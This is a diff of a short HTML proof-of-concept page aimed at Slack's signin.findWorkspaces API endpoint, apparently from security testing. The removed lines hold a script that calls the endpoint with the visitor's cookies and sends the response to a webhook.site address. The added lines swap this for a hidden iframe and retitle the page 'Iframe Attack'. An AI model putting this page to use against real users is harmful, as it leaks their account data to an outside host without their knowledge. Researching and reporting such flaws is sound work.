@@ -1,22 +1,12 @@
+
+
+
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Test Page</title>
+    <title>Iframe Attack</title>
 </head>
 <body>
-    <h1>Click Here</h1>
-    <script>
-        fetch("https://slack.com/api/signin.findWorkspaces", { credentials: "include" })
-            .then(response => response.text())
-            .then(data => {
-                fetch("https://webhook.site/c1acb3f9-304c-414d-b941-3e8094798029" + encodeURIComponent(data));
-            })
-            .catch(err => console.error("Error:", err));
-    </script>
+    <iframe src="https://slack.com/api/signin.findWorkspaces" style="display:none;"></iframe>
 </body>
 </html>
-
-
-
-
-
